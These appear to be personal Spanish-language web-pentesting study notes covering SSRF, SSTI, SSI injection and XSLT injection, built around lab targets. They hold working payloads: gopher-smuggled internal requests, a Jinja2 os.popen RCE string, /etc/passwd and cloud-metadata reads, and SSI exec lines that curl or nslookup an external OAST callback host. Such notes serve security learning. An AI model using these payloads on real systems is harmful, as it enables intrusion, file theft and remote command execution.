# SSRF
Ocurre cuando una aplicación permite que el usuario controle una URL o destino que el **servidor** solicita internamente. 
El navegador atacante no hace la petición final
```
Atacante → App vulnerable → Recurso interno / externo
```
Impacto: 
- Acceso a servicios internos
- Bypass de firewalls
- Lectura de metadata cloud
- Enumeración de puertos internos
- Acceso a paneles localhost
- Pivot hacia Redis, Elasticsearch, Jenkins, Docker API, etc.
Es interesante probar otros protocolos además del http, como 
- `file://` : Permite leer contenido local, p.ej: `file:///etc/passwd`
- `gopher://`: Permite una conexión TCP casi arbitraria. Permitiría hablar con servicios internos no HTTP usando bytes crudos
### Ejemplo de enumeración de puertos
Si tras hacer una petición interna a `http://127.0.0.1:81` recibimos como respuesta algo como `Failed to connect to 127.0.0.1 port 81 ...` podemos hacer enumeración de puertos como sigue

```bash
# Generamos diccinaorio puertos
seq 1 10000 > ports.txt
# fuzzeamos sobre ese diccinario
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
### Peticiones con `gopher`
Podemos envíar datos arbitrarios a un host y un puerto. Formato típico:
```bash
gopher://HOST:PUERTO/_PAYLOAD
#Ejemplo
url=gopher://127.0.0.1:6379/_PING
```
El `_` indica el selector Gopher. Todo lo que viene después puede convertirse en bytes enviados al socket. 

#### Ejemplo de petición POST con gopher
Supongamos el siguiente escenario, en el que el campo POST `dataserver` puede apuntar a un servicio interno
```http
POST /index.php HTTP/1.1
Host: 10.129.89.179
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://10.129.89.179
Connection: keep-alive
Referer: http://10.129.89.179/
Priority: u=0

dateserver=http://dateserver.htb/availability.php&date=2024-01-01
```
Imaginemos que queremos enviar el siguiente contenido al servidor interno:
```http
POST /admin.php HTTP/1.1 
Host: dateserver.htb Content-Length: 13 
Content-Type: application/x-www-form-urlencoded 

adminpw=admin
```
Para envíar la petición correctamente hay que **urlencodear dos veces**. Primero debemos urlencodear espacios y saltos de línea (CRLF)
```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
y después urlencodear el parámetro dataserver, porque estamos envíando una url dentro del parámetro post, quedando la petición:
```html
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```
#### Ejemplo get
Del mismo modo que con post, podríamos crear una petición con get como sigue: 
```http
gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0a%0d%0a
```
#### [Gopherus](https://github.com/tarunkant/Gopherus/blob/master/install.sh)
Dado que envíar una petición manualmente puede ser un poco incómodo, podemos utilizar esta herramienta, que permite construir peticiones  sintácticamente y semánticamente a URLs sin tanto esfuerzo.  Ejemplo de uso: 
```bash
python 2.7 gopherus.py --exploit smtp
```
### Blind
Podemos inducir que hay blind SSRF si según la petición la respuesta varía. Ej
```html
dataserver=http://127.0.0.1:81&date=...  ->  Something went wrong
dataserver=http://127.0.0.1:8080&date=... ->  Date is unavailible
dataserver=file://etc/passwd&date=...  ->  Date is unavailible
dataserver=file://invalid/filename&date=...  ->  Something went wrong
```
Si estamos en la misma red, podemos ponernos en escucha en nc y hacer peticiones a nuestra ip
```bash
# maquina atacante
nc -nlvp 8000
# petición 
...
dataserver=http://$vpnip:8000&date=...
```
Podemos intentar oast también: 
```html
dataserver=http://abc.oastify.com&date=---
dataserver=ftp://abc.oastify.com/test&date=---
dataserver=gopher://abc.oastify.com:70/_test&date=---
```
### Prevencion
 [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## SSTI
Más información en [paylaod all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

**SSTI** ocurre cuando una aplicación inserta input del usuario dentro de una plantilla que luego es evaluada por el motor de templates en el servidor.
```
Usuario → input controlado → template engine → renderizado server-side
```
### Payloads de detección
Podemos utilizar algunos de los payloads polyglot que aparecen a continuación
```
${{<%[%'"}}%\.

```
contiene todos los caracteres especiales que pueden estar en cualquier motor.
Algunos payloads genéricios pueden ser los que siguen: 
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
[[${7*7}]]
```
### Identificación
https://cheatsheet.hackmanit.de/template-injection-table/

![[Pasted image 20260519121953.png]]

| Motor / stack           | Payloads de detección                               |
| ----------------------- | --------------------------------------------------- |
| Jinja2 / Flask / Python | `{{7*7}}`, `{{7*'7'}}`, `{{config}}`, `{{request}}` |
| Twig / Symfony / PHP    | `{{7*7}}`, `{{7*'7'}}`, `{{_self}}`, `{{app}}`      |
| Smarty / PHP            | `a{*comment*}b`, `{$smarty.version}`, `{7*7}`       |
| Mako / Python           | `${7*7}`, `${"z".join("ab")}`                       |
| Freemarker / Java       | `${7*7}`, `${.version}`, `${.locale}`               |
| Velocity / Java         | `#set($x=7*7)$x`, `$class`, `$request`              |
| ERB / Ruby              | `<%= 7*7 %>`, `<%= RUBY_VERSION %>`                 |
| EJS / Node.js           | `<%= 7*7 %>`, `<%= process.version %>`              |
| Thymeleaf / Java        | `[[${7*7}]]`, `${7*7}`                              |

| Payload / señal           | Motor probable                    |
| ------------------------- | --------------------------------- |
| `{{7*7}} → 49`            | Jinja2 / Twig / similar           |
| `{{7*'7'}} → 7777777`     | Jinja2                            |
| `{{7*'7'}} → 49`          | Twig                              |
| `{{config}}`              | Flask / Jinja2                    |
| `{{app}}`, `{{_self}}`    | Symfony / Twig                    |
| `${7*7} → 49`             | Mako / Freemarker / Velocity / EL |
| `a{*comment*}b → ab`      | Smarty                            |
| `${"z".join("ab")} → azb` | Mako                              |
| `${.version}`             | Freemarker                        |
| `#set($x=7*7)$x → 49`     | Velocity                          |
| `[[${7*7}]] → 49`         | Thymeleaf                         |
| `<%= 7*7 %> → 49`         | ERB / EJS                         |
| `<%= RUBY_VERSION %>`     | ERB / Ruby                        |
| `<%= process.version %>`  | EJS / Node.js                     |
| `#{7*7} → 49`             | Pug / Slim / EL-like              |
### Ejemplo Jinja2
Tras confirmar que estamos en Jinja2, podemos utilizar algunos payloads como los que siguen: 
- Configuración de la web
	```
	{{ config.items() }}
	```
- Funciones incorporadas disponibles
```
{{ self.__init__.__globals__.__builtins__ }}
```
- Si encontramos funciones como `open`, podemos tener LFI
	```
	{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
	```
- Para rce necesitamos funciones proporcionadas por la librería `os`, como `system` o `popen`
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### Qué es `__` en Python

`__` se lee normalmente como **dunder**, de `double underscore`. Ejemplos:

|Atributo|Qué representa|Uso en SSTI|
|---|---|---|
|`__class__`|Clase del objeto|Saber de qué tipo es|
|`__dict__`|Atributos del objeto|Enumerar propiedades|
|`__mro__`|Jerarquía de herencia|Subir por clases base|
|`__subclasses__()`|Clases cargadas que heredan de una clase|Buscar clases útiles|
|`__init__`|Constructor de una clase/objeto|Punto de entrada a función|
|`__globals__`|Globals de una función Python|Acceder a módulos/imports|
|`__builtins__`|Funciones built-in de Python|`open`, `eval`, `__import__`, etc.|
Ejemplo de significado __:
```python
{{ self.__init__.__globals__ }}
# “Desde el constructor, enséñame el diccionario global del módulo donde vive”
```
### Herramienta: SSTImap

Podemos descargar la herramienta del [repositorio oficial](https://github.com/vladko312/SSTImap)
```bash
# uso tras instalación con requirements.txt
# podemos utilizar flag como -D para descargar archivo local o -S para ejecutar un comando de sistema, o incluso recibir una shell 
python sstimap.py  -u 'http://154.57.164.74:32490/index.php?name=hola'
--os-shell
```

## SSI - Server Side Includes

Permite que el servidor web procese directivas dentro de HTML antes de entregar la respuesta al cliente. Ejemplo:
```
<!--#echo var="DATE_LOCAL" -->
```
El navegador no interpreta eso. Lo interpreta el **servidor**.
```
Usuario → HTML con directiva SSI → servidor procesa → respuesta final
```
Si el atacante puede inyectar una directiva SSI en contenido que luego el servidor parsea, hay **SSI Injection**.
- Extensiones sospechosas
	```
	.shtml
	.shtm
	.stm
	.html  si el servidor tiene SSI habilitado también en HTML
	```
- Servidores típicos
	```
	Apache con mod_include
	Nginx con ssi on
	IIS / servidores legacy con SSI
	```
### Directivas SSI
SSI utiliza directivas para añadir dinámicamente contenido a una página web. La sintaxis general es:
```
<!--#name param1="value1" param2="value" -->
```

#### Directivas SSTI útiles
| Directiva         | Ejemplo                               | Uso                                                | Señal de éxito                                                        |
| ----------------- | ------------------------------------- | -------------------------------------------------- | --------------------------------------------------------------------- |
| `echo`            | `<!--#echo var="DATE_LOCAL" -->`      | Mostrar variables del servidor                     | Aparece la fecha/hora del servidor                                    |
| `printenv`        | `<!--#printenv -->`                   | Enumerar variables de entorno                      | Aparecen variables como `SERVER_NAME`, `DOCUMENT_ROOT`, `REQUEST_URI` |
| `include file`    | `<!--#include file="footer.html" -->` | Incluir archivo local relativo al documento actual | Se inserta el contenido del archivo                                   |
| `include virtual` | `<!--#include virtual="/status" -->`  | Incluir una ruta web local                         | Se renderiza el contenido de `/status`                                |
| `fsize`           | `<!--#fsize file="index.html" -->`    | Mostrar tamaño de archivo                          | Devuelve tamaño de `index.html`                                       |
| `flastmod`        | `<!--#flastmod file="index.html" -->` | Mostrar última modificación                        | Devuelve timestamp de modificación                                    |
| `exec`            | `<!--#exec cmd="id" -->`              | Ejecutar comandos si está habilitado               | Devuelve salida del comando                                           |

#### Variables del servidor

| Variable          | Payload                               | Utilidad                          |
| ----------------- | ------------------------------------- | --------------------------------- |
| `DATE_LOCAL`      | `<!--#echo var="DATE_LOCAL" -->`      | Confirmación rápida de SSI        |
| `SERVER_SOFTWARE` | `<!--#echo var="SERVER_SOFTWARE" -->` | Fingerprint del servidor          |
| `DOCUMENT_ROOT`   | `<!--#echo var="DOCUMENT_ROOT" -->`   | Ruta raíz del sitio               |
| `REQUEST_URI`     | `<!--#echo var="REQUEST_URI" -->`     | Confirmar contexto de la petición |
| Todas             | `<!--#printenv -->`                   | Enumeración completa              |
#### Payloads útiles
| Objetivo                  | Payload                                                  | Señal de éxito                                                   |
| ------------------------- | -------------------------------------------------------- | ---------------------------------------------------------------- |
| Confirmar SSI             | `<!--#echo var="DATE_LOCAL" -->`                         | Aparece fecha/hora del servidor                                  |
| Enumerar entorno          | `<!--#printenv -->`                                      | Variables como `DOCUMENT_ROOT`, `SERVER_SOFTWARE`, `REQUEST_URI` |
| Fingerprint del servidor  | `<!--#echo var="SERVER_SOFTWARE" -->`                    | Nombre/versión del servidor web                                  |
| Descubrir ruta web        | `<!--#echo var="DOCUMENT_ROOT" -->`                      | Ruta tipo `/var/www/html`                                        |
| Incluir recurso relativo  | `<!--#include file="config.html" -->`                    | Se inserta contenido del archivo                                 |
| Probar traversal relativo | `<!--#include file="../config.html" -->`                 | Contenido o error SSI                                            |
| Incluir endpoint interno  | `<!--#include virtual="/admin" -->`                      | HTML interno renderizado                                         |
| Probar Apache status      | `<!--#include virtual="/server-status" -->`              | Página de estado o error distinto                                |
| RCE blind HTTP            | `<!--#exec cmd="curl http://COLLAB.oastify.com/ssi" -->` | Callback HTTP recibido                                           |
| RCE blind DNS             | `<!--#exec cmd="nslookup COLLAB.oastify.com" -->`        | Query DNS recibida                                               |
| RCE blind alternativa     | `<!--#exec cmd="ping -c 1 COLLAB.oastify.com" -->`       | Query DNS/ICMP observada si hay salida                           |
## XSLT Inyection
**XSLT** transforma XML en otro formato, normalmente HTML, XML o texto.
```
XML de entrada + XSLT stylesheet → motor XSLT server-side → salida renderizada
```
Hay vulnerabilidad cuando el atacante puede controlar total o parcialmente el **stylesheet XSLT** que procesa el servidor.
```
Atacante controla XSLT → servidor lo evalúa → disclosure / SSRF / file read / RCE según motor
```
### Ejemplo de funcionamiento de XSLT
Algunos elementos de un documento XSLT suelen usar el prefijo `xsl`, que pertenece al namespace oficial de XSLT:

```
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
```

Los elementos más comunes son:

|Elemento|Descripción|
|---|---|
|`<xsl:template>`|Define una plantilla XSLT. Normalmente usa el atributo `match` para indicar sobre qué nodo o ruta del XML se aplica.|
|`<xsl:value-of>`|Extrae el valor de un nodo o expresión XPath indicado en el atributo `select`.|
|`<xsl:for-each>`|Itera sobre todos los nodos seleccionados mediante el atributo `select`.|
|`<xsl:sort>`|Ordena los nodos dentro de un bucle o selección.|
|`<xsl:if>`|Aplica una condición antes de renderizar contenido.|

**Ejemplo: renderizar frutas desde un XML**
Algunos elementos de un documento XSLT suelen usar el prefijo `xsl`, que pertenece al namespace oficial de XSLT:

```xml
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
```

Los elementos más comunes son:

|Elemento|Descripción|
|---|---|
|`<xsl:template>`|Define una plantilla XSLT. Normalmente usa el atributo `match` para indicar sobre qué nodo o ruta del XML se aplica.|
|`<xsl:value-of>`|Extrae el valor de un nodo o expresión XPath indicado en el atributo `select`.|
|`<xsl:for-each>`|Itera sobre todos los nodos seleccionados mediante el atributo `select`.|
|`<xsl:sort>`|Ordena los nodos dentro de un bucle o selección.|
|`<xsl:if>`|Aplica una condición antes de renderizar contenido.|

Este documento XSLT selecciona las frutas dentro del nodo raíz `<fruits>`, las ordena por color en orden descendente y solo muestra aquellas cuyo tamaño sea `Medium`.

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/fruits">
    Here are all fruits of medium size ordered by their color:

    <xsl:for-each select="fruit">
      <xsl:sort select="color" order="descending" />

      <xsl:if test="size = 'Medium'">
        <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
      </xsl:if>
    </xsl:for-each>
  </xsl:template>

</xsl:stylesheet>
```

XML de entrada:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
  <fruit>
    <name>Apple</name>
    <color>Red</color>
    <size>Medium</size>
  </fruit>
  <fruit>
    <name>Banana</name>
    <color>Yellow</color>
    <size>Medium</size>
  </fruit>
  <fruit>
    <name>Strawberry</name>
    <color>Red</color>
    <size>Small</size>
  </fruit>
</fruits>
```

Salida renderizada:

```
Here are all fruits of medium size ordered by their color:
	Banana (Yellow)
	Apple (Red)
```

### Inyección
#### Dónde aparece
Funcionalidades sospechosas:

|Funcionalidad|Riesgo|
|---|---|
|Transformador XML a HTML|Usuario controla XSLT o parte del template|
|Import/export XML|Plantillas XSLT personalizables|
|Generación de informes|XSLT subido o modificado por usuario|
|SOAP/XML APIs|Transformaciones server-side|
|SAML/XML processing|Transformaciones mal aisladas|
|CMS con XML templates|Plantillas XSLT editables|
|Conversores XML → PDF/HTML|XSLT procesado en backend|
|Parámetros `name`, `title`, `template`, `xsl`, `xml`, `stylesheet`|Input insertado antes del procesamiento XSLT|
#### Payloads de detección

| Objetivo               | Payload XSLT                                                   | Señal             |
| ---------------------- | -------------------------------------------------------------- | ----------------- |
| Confirmar ejecución    | `<xsl:value-of select="7*7"/>`                                 | `49`              |
| Leer texto del XML     | `<xsl:value-of select="/"/>`                                   | Contenido del XML |
| Fingerprint vendor     | `<xsl:value-of select="system-property('xsl:vendor')"/>`       | Motor XSLT        |
| Fingerprint versión    | `<xsl:value-of select="system-property('xsl:version')"/>`      | Versión XSLT      |
| Fingerprint URL vendor | `<xsl:value-of select="system-property('xsl:vendor-url')"/>`   | URL/vendor        |
| Probar funciones       | `<xsl:value-of select="function-available('document')"/>`      | `true` / `false`  |
| Probar extensiones     | `<xsl:value-of select="function-available('exsl:node-set')"/>` | Soporte EXSLT     |
**Payload de fingerprint completo**
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```
#### Payloads útiles
| Objetivo                   | Payload                                                                         | Señal                                   |
| -------------------------- | ------------------------------------------------------------------------------- | --------------------------------------- |
| SSRF / callback OAST       | `<xsl:value-of select="document('http://COLLAB.oastify.com/x')"/>`              | DNS/HTTP callback                       |
| Cargar XSL externo         | `<xsl:include href="http://COLLAB.oastify.com/include.xsl"/>`                   | Callback HTTP                           |
| Importar XSL externo       | `<xsl:import href="http://COLLAB.oastify.com/import.xsl"/>`                     | Callback HTTP                           |
| Probar localhost           | `<xsl:value-of select="document('http://127.0.0.1:8080/')"/>`                   | Error distinto, timeout o contenido XML |
| Probar metadata cloud      | `<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>` | Callback interno o error de parseo      |
| Leer XML local             | `<xsl:copy-of select="document('file:///var/www/html/config.xml')"/>`           | Contenido XML local                     |
| LFI XSLT 2.0               | `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>`                | Contenido de archivo si XSLT 2.0+       |
| LFI vía PHP                | `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>`      | Contenido de archivo                    |
| RCE vía PHP                | `<xsl:value-of select="php:function('system','id')"/>`                          | `uid=... gid=...`                       |
| Escribir archivo con EXSLT | `<exsl:document href="/tmp/xslt.txt" method="text">test</exsl:document>`        | Archivo creado si hay permisos          |
